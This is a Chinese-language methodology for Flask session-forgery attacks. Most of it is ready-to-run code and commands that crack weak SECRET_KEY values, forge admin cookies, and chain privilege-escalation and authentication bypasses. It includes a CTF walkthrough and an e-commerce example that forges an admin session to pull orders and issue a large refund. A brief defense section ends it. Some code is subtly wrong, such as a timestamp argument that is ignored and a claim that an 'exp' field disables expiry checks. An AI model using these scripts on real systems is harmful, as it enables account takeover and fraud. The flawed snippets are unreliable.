# Flask 会话伪造攻击方法论

## 1. 技术介绍

### 1.1 漏洞原理

Flask 会话伪造漏洞发生在应用程序使用客户端会话（Client-Side Session）且会话密钥（SECRET_KEY）被攻击者获知时。Flask 默认使用 `itsdangerous` 库对会话数据进行 HMAC 签名，签名仅证明会话由知道密钥的人创建，但不加密会话内容。

当攻击者获知 SECRET_KEY 后，可以：
1. **伪造任意用户会话** - 创建包含任意用户名的有效会话 Cookie
2. **权限提升** - 伪造管理员会话获取特权访问
3. **完全认证绕过** - 无需密码即可登录任意账户

### 1.2 漏洞本质

Flask 会话伪造的本质是**弱密钥暴露**：SECRET_KEY 硬编码在源代码中、提交到版本控制系统、或在配置文件中明文存储，导致攻击者可以轻易获取并使用该密钥伪造合法的会话 Cookie。

### 1.3 Flask 会话机制

**会话数据结构:**
```
session_cookie = base64(payload).timestamp.hmac_signature
```

**Payload 内容:**
```python
{
    'username': 'admin',
    'role': 'user',
    'email': 'user@example.com'
    # 任何应用存储的会话数据
}
```

**签名算法:**
- 默认使用 HMAC-SHA1
- 密钥：应用配置的 SECRET_KEY
- Salt: 默认为 'cookie-session'

---

## 2. 攻击常见于哪些业务场景

### 2.1 硬编码密钥场景

| 业务场景 | 风险点描述 | 典型代码 |
|---------|-----------|---------|
| 开发配置未移除 | 开发时设置的弱密钥保留到生产环境 | `app.secret_key = 'dev_secret'` |
| CTF 挑战应用 | 故意暴露密钥供参赛者利用 | `app.secret_key = 'supersecretkey'` |
| 示例代码直接部署 | 从教程复制的代码包含示例密钥 | `app.secret_key = 'your_secret_key'` |
| 密钥提交到 Git | SECRET_KEY 随代码提交到版本控制 | `settings.py` 包含硬编码密钥 |

### 2.2 弱密钥场景

| 风险点描述 | 示例密钥 | 风险等级 |
|-----------|---------|---------|
| 简单字符串 | `'secret'`、`'123456'` | 高 |
| 常见短语 | `'supersecretkey'`、`'mysecretkey'` | 高 |
| 应用名称 | `'flask_app_secret'` | 高 |
| 键盘模式 | `'qwerty'`、`'asdfgh'` | 高 |
| 短密钥（<16 字符） | `'shortkey'` | 中 |

### 2.3 会话数据可控场景

| 场景 | 风险描述 |
|-----|---------|
| 会话存储用户名 | 伪造 Cookie 可冒充任意用户 |
| 会话存储角色信息 | 伪造 Cookie 可提升权限（role='admin'） |
| 会话存储用户 ID | 伪造 Cookie 可访问他人数据 |
| 会话存储权限标志 | 伪造 Cookie 可绕过访问控制 |

---

## 3. 漏洞探测方法

### 3.1 黑盒测试

#### 3.1.1 识别 Flask 会话 Cookie

**Cookie 特征:**
```
Set-Cookie: session=eyJ1c2VybmFtZSI6InRlc3QifQ.ZyQxMA.ABC123...
                     └────┬────┘ └──┬──┘ └───┬───┘
                      payload     timestamp  signature
```

**识别方法:**
1. Cookie 值包含两个点（`.`）分隔的三段
2. 第一段是 Base64 编码（解码后为 JSON）
3. 响应头包含 `Werkzeug` 或 `Flask` 标识

#### 3.1.2 密钥猜测测试

**常见弱密钥测试列表:**
```python
common_secrets = [
    'secret',
    'dev',
    'test',
    'flask',
    'secret_key',
    'your_secret_key',
    'supersecretkey',
    'admin',
    'password',
    '123456',
    'qwerty',
    'changeme',
    'development',
    'production'
]
```

**测试方法:**
```python
from itsdangerous import URLSafeTimedSerializer

def test_secret_key(cookie_value, secret_candidate):
    """测试候选密钥是否能验证 Cookie"""
    try:
        serializer = URLSafeTimedSerializer(
            secret_key=secret_candidate,
            salt='cookie-session'
        )
        # 尝试解码 Cookie（不验证时间戳）
        data = serializer.loads(cookie_value, max_age=999999999)
        return True, data
    except:
        return False, None

# 遍历常见密钥列表
for secret in common_secrets:
    success, data = test_secret_key(target_cookie, secret)
    if success:
        print(f'[+] Found SECRET_KEY: {secret}')
        print(f'[+] Session data: {data}')
        break
```

### 3.2 白盒测试

#### 3.2.1 代码审计关键词

**Python/Flask 代码搜索:**
```python
# 搜索 SECRET_KEY 配置
app.secret_key =
SECRET_KEY =
app.config['SECRET_KEY']
os.environ.get('SECRET_KEY')

# 搜索 itsdangerous 使用
URLSafeTimedSerializer
TimedSerializer
Signer

# 搜索会话操作
session['username']
session['role']
session['user_id']
```

#### 3.2.2 配置文件检查

**检查以下文件:**
- `config.py`
- `settings.py`
- `.env`
- `app.py`
- `__init__.py`
- `instance/config.py`

**危险配置示例:**
```python
# 危险：硬编码密钥
app.secret_key = 'my_super_secret_key_123'

# 危险：弱密钥生成
app.secret_key = 'flask_app_' + str(datetime.now().year)

# 安全：环境变量
app.secret_key = os.environ.get('SECRET_KEY') or os.urandom(32)
```

#### 3.2.3 Git 历史检查

```bash
# 检查 Git 历史中的密钥
git log -p --all -- '**/config.py' '**/settings.py' '**/*.py' | grep -i secret

# 检查被删除的敏感配置
git log --all --full-history -- '**/*.py' | grep -B5 -A5 secret_key

# 使用 truffleHog 等工具扫描
trufflehog --regex --entropy=False .
```

---

## 4. 漏洞利用方法

### 4.1 使用 flask-unsign 工具

**安装:**
```bash
pip install flask-unsign
```

**探测模式（验证密钥）:**
```bash
# 尝试常见密钥
flask-unsign --unsign --cookie 'eyJ1c2VybmFtZSI6InRlc3QifQ.ZyQxMA.ABC123'

# 使用密钥列表
flask-unsign --unsign --cookie 'eyJ1c2VybmFtZSI6InRlc3QifQ.ZyQxMA.ABC123' \
    --wordlist common_secrets.txt
```

**伪造模式（创建恶意 Cookie）:**
```bash
# 伪造 admin 会话
flask-unsign --sign --cookie "{'username': 'admin'}" \
    --secret 'supersecretkey'

# 输出：eyJ1c2VybmFtZSI6ImFkbWluIn0.aQLkTg.82-rW1l-uckxBwiSHRL6jNk92WI

# 伪造管理员角色
flask-unsign --sign --cookie "{'username': 'user', 'role': 'admin'}" \
    --secret 'supersecretkey'

# 伪造用户 ID
flask-unsign --sign --cookie "{'user_id': 1, 'is_admin': true}" \
    --secret 'supersecretkey'
```

### 4.2 使用 Python 脚本伪造

**基础伪造脚本:**
```python
from itsdangerous import URLSafeTimedSerializer
import hashlib

def forge_flask_session(secret_key, session_data):
    """伪造 Flask 会话 Cookie"""
    serializer = URLSafeTimedSerializer(
        secret_key=secret_key,
        salt='cookie-session',
        signer_kwargs={
            'key_derivation': 'hmac',
            'digest_method': hashlib.sha1
        }
    )
    return serializer.dumps(session_data)

# 示例：伪造 admin 会话
secret = 'supersecretkey'
payload = {'username': 'admin'}

forged_cookie = forge_flask_session(secret, payload)
print(f'Forged Cookie: {forged_cookie}')
```

**高级伪造（包含时间戳）:**
```python
from itsdangerous import URLSafeTimedSerializer, TimestampSigner
import time

def forge_session_with_timestamp(secret_key, session_data, timestamp=None):
    """伪造带时间戳的会话"""
    if timestamp is None:
        timestamp = int(time.time())

    serializer = URLSafeTimedSerializer(
        secret_key=secret_key,
        salt='cookie-session'
    )

    # 创建会话
    cookie = serializer.dumps(session_data)

    return cookie, timestamp

# 伪造一个"旧"会话（绕过新鲜度检查）
old_timestamp = int(time.time()) - 86400  # 1 天前
cookie, ts = forge_session_with_timestamp(
    'supersecretkey',
    {'username': 'admin', 'login_time': old_timestamp},
    timestamp=old_timestamp
)
```

### 4.3 权限提升攻击链

#### 4.3.1 垂直权限提升（用户→管理员）

**场景**: 应用通过会话中的 `role` 字段判断权限

```bash
# 步骤 1: 注册普通用户并登录
curl -X POST http://localhost:37053/register \
  -d "username=attacker&password=pass123"

curl -X POST http://localhost:37053/login \
  -d "username=attacker&password=pass123" \
  -c cookies.txt

# 步骤 2: 提取会话 Cookie
SESSION_COOKIE=$(grep session cookies.txt | awk '{print $7}')

# 步骤 3: 解码查看当前会话数据
flask-unsign --unsign --cookie "$SESSION_COOKIE"
# 输出：{'username': 'attacker', 'role': 'user'}

# 步骤 4: 伪造管理员会话
ADMIN_COOKIE=$(flask-unsign --sign \
    --cookie "{'username': 'admin', 'role': 'admin'}" \
    --secret 'supersecretkey')

# 步骤 5: 使用伪造 Cookie 访问管理员功能
curl -H "Cookie: session=$ADMIN_COOKIE" \
    http://localhost:37053/admin/dashboard
```

#### 4.3.2 水平权限提升（用户 A→用户 B）

**场景**: 应用通过会话中的 `user_id` 识别用户

```python
import requests
from itsdangerous import URLSafeTimedSerializer

# 已知密钥
SECRET_KEY = 'supersecretkey'

# 目标用户 ID
TARGET_USER_ID = 1  # admin 用户

# 伪造目标用户会话
serializer = URLSafeTimedSerializer(SECRET_KEY, salt='cookie-session')
forged_session = serializer.dumps({'user_id': TARGET_USER_ID, 'username': 'admin'})

# 使用伪造会话访问
session = requests.Session()
session.cookies.set('session', forged_session)

# 访问目标用户的数据
response = session.get('http://localhost:37053/profile')
print(response.text)
```

### 4.4 完全认证绕过

**场景**: 应用仅检查会话中是否存在 `username` 字段

```python
import requests
from itsdangerous import URLSafeTimedSerializer

SECRET_KEY = 'supersecretkey'

# 伪造任意用户会话（无需注册/登录）
serializer = URLSafeTimedSerializer(SECRET_KEY, salt='cookie-session')

# 直接成为任何用户
for username in ['admin', 'root', 'administrator', 'testuser']:
    forged = serializer.dumps({'username': username})

    session = requests.Session()
    session.cookies.set('session', forged)

    response = session.get('http://localhost:37053/profile')

    if response.status_code == 200:
        print(f'[+] Successfully impersonated: {username}')
        # 检查是否获取到敏感数据
        if 'FLAG' in response.text or 'flag' in response.text:
            print(f'[+] Found FLAG with user: {username}')
```

---

## 5. 漏洞利用绕过方法

### 5.1 绕过会话过期检查

**场景**: 应用检查会话时间戳

```python
from itsdangerous import URLSafeTimedSerializer
import time

SECRET_KEY = 'supersecretkey'

# 方法 1: 使用当前时间戳（默认行为）
serializer = URLSafeTimedSerializer(SECRET_KEY, salt='cookie-session')
cookie = serializer.dumps({'username': 'admin'})

# 方法 2: 伪造过去的时间戳（绕过新鲜度检查）
class CustomSigner(TimestampSigner):
    def __init__(self, secret_key, salt=None):
        super().__init__(secret_key, salt=salt)
        self._forced_timestamp = int(time.time()) - 3600  # 1 小时前

    def get_timestamp(self):
        return self._forced_timestamp

# 方法 3: 移除时间戳验证
cookie = serializer.dumps({'username': 'admin', 'exp': None})
```

### 5.2 绕过会话绑定检查

**场景**: 应用绑定会话到 IP 地址或 User-Agent

```python
# 方法 1: 在会话中包含正确的 IP/User-Agent
SECRET_KEY = 'supersecretkey'
serializer = URLSafeTimedSerializer(SECRET_KEY, salt='cookie-session')

# 伪造包含受害者 IP 的会话
cookie = serializer.dumps({
    'username': 'victim',
    'ip': '192.168.1.100',  # 受害者 IP
    'user_agent': 'Mozilla/5.0...'  # 受害者 UA
})

# 方法 2: 如果应用存储哈希，需要逆向或绕过
# 这通常需要额外的漏洞（如信息泄露）来获取哈希值
```

### 5.3 绕过会话指纹识别

**场景**: 应用使用额外字段验证会话完整性

```python
# 方法：从现有合法会话中提取指纹字段
from itsdangerous import URLSafeTimedSerializer

SECRET_KEY = 'supersecretkey'
serializer = URLSafeTimedSerializer(SECRET_KEY, salt='cookie-session')

# 解码合法会话查看结构
legitimate_cookie = 'eyJ1c2VybmFtZSI6InRlc3QifQ.ZyQxMA.ABC123'
legitimate_data = serializer.loads(legitimate_cookie)
print(f'Legitimate session structure: {legitimate_data}')

# 输出可能包含：{'username': 'test', 'fingerprint': 'abc123', 'device_id': 'xyz'}

# 伪造时包含相同结构
forged_cookie = serializer.dumps({
    'username': 'admin',
    'fingerprint': legitimate_data['fingerprint'],
    'device_id': legitimate_data['device_id']
})
```

### 5.4 盲测密钥（无源代码访问）

**场景**: 无法直接获取 SECRET_KEY，需要暴力破解

```python
from itsdangerous import URLSafeTimedSerializer
from itertools import product
import string

def brute_force_secret(cookie_value, known_length=8):
    """暴力破解 SECRET_KEY（仅适用于短密钥）"""

    # 字符集（可根据应用特征调整）
    charset = string.ascii_lowercase + string.digits

    for length in range(1, known_length + 1):
        for candidate in product(charset, repeat=length):
            secret = ''.join(candidate)

            try:
                serializer = URLSafeTimedSerializer(secret, salt='cookie-session')
                data = serializer.loads(cookie_value, max_age=999999999)

                print(f'[+] Found SECRET_KEY: {secret}')
                print(f'[+] Session data: {data}')
                return secret, data
            except:
                continue

    print('[-] SECRET_KEY not found in search space')
    return None, None

# 注意：仅适用于短密钥（<=8 字符）
# 对于更长密钥，需要字典攻击或从其他渠道获取
```

---

## 6. 实战攻击链示例

### 6.1 Synthwave User Portal 完全攻陷

**目标应用**: Flask 用户门户（CTF 挑战）

**已知信息**:
- 应用使用 Flask 会话
- SECRET_KEY 硬编码为 `'supersecretkey'`
- 管理员页面显示 FLAG 给 `username == 'admin'` 的用户

**攻击步骤**:

```bash
# 步骤 1: 安装工具
pip install flask-unsign

# 步骤 2: 伪造 admin 会话 Cookie
ADMIN_COOKIE=$(flask-unsign --sign \
    --cookie "{'username': 'admin'}" \
    --secret 'supersecretkey')

echo "Forged Cookie: $ADMIN_COOKIE"
# 输出：eyJ1c2VybmFtZSI6ImFkbWluIn0.aQLkTg.82-rW1l-uckxBwiSHRL6jNk92WI

# 步骤 3: 使用伪造 Cookie 访问管理员页面
curl -s -H "Cookie: session=$ADMIN_COOKIE" \
    http://localhost:37053/profile | grep -oP 'FLAG\{[^}]+\}'

# 输出：FLAG{6405c2f787acd0c63e0812b1f377e35d55753310c8c30c98183ed63ec23a5e2d}
```

**攻击时间**: < 1 分钟
**攻击复杂度**: 极低（单行命令）

### 6.2 电商应用权限提升

**目标应用**: 电商平台

**已知信息**:
- 会话存储 `user_id` 和 `role` 字段
- SECRET_KEY 泄露为 `'ecommerce_secret_2024'`
- 普通用户无法访问 `/admin/orders`

**攻击步骤**:

```python
import requests
from itsdangerous import URLSafeTimedSerializer

# 配置
SECRET_KEY = 'ecommerce_secret_2024'
TARGET_URL = 'http://shop.example.com'

# 伪造管理员会话
serializer = URLSafeTimedSerializer(SECRET_KEY, salt='cookie-session')
admin_cookie = serializer.dumps({
    'user_id': 1,
    'username': 'admin',
    'role': 'administrator',
    'permissions': ['view_orders', 'manage_users', 'refund_payments']
})

# 访问管理员功能
session = requests.Session()
session.cookies.set('session', admin_cookie)

# 获取所有订单
orders = session.get(f'{TARGET_URL}/admin/orders')
print(f'[+] Retrieved {len(orders.text)} bytes of order data')

# 执行退款（示例）
refund_data = {
    'order_id': 'ORD-12345',
    'amount': 9999.99,
    'reason': 'Fraud test'
}
response = session.post(f'{TARGET_URL}/admin/refund', json=refund_data)
print(f'[+] Refund response: {response.status_code}')
```

---

## 7. 检测与防御建议

### 7.1 检测会话伪造攻击

**应用层检测:**
- 监控异常会话创建（如来自新 IP 的管理员会话）
- 记录会话验证失败事件
- 检测会话数据的异常变化（如 role 字段突然改变）

**网络层检测:**
- 监控对 SECRET_KEY 的暴力破解尝试（大量 Cookie 验证请求）
- 检测使用已知弱密钥的应用实例

### 7.2 防御会话伪造攻击

**密钥管理:**
```python
# 安全：使用强随机密钥
import os
app.secret_key = os.urandom(32)  # 256 位随机密钥

# 安全：从环境变量读取
app.secret_key = os.environ.get('SECRET_KEY')

# 安全：使用密钥管理服务
# app.secret_key = get_secret_from_vault()
```

**会话安全增强:**
```python
# 配置安全的 Cookie 参数
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=True,      # 仅 HTTPS
    SESSION_COOKIE_SAMESITE='Lax',
    PERMANENT_SESSION_LIFETIME=3600  # 1 小时过期
)

# 会话轮换（登录后）
@app.route('/login', methods=['POST'])
def login():
    # ... 验证凭证 ...
    session.clear()  # 清除旧会话
    session['username'] = username
    session['session_id'] = generate_new_session_id()  # 新会话 ID
    return redirect(url_for('profile'))
```

**服务端会话存储:**
```python
# 使用服务器端会话（Redis/数据库）
from flask_session import Session

app.config['SESSION_TYPE'] = 'redis'
app.config['SESSION_REDIS'] = redis.Redis(host='localhost', port=6379)
Session(app)

# 会话数据存储在服务器，Cookie 仅包含会话 ID
# 即使密钥泄露，攻击者也无法伪造有效会话
```

---

## 8. 参考资源

- [Flask Session Security](https://flask.palletsprojects.com/en/2.3.x/quickstart/#sessions)
- [itsdangerous Documentation](https://itsdangerous.palletsprojects.com/)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [flask-unsign GitHub](https://github.com/Paradoxis/flask-unsign)
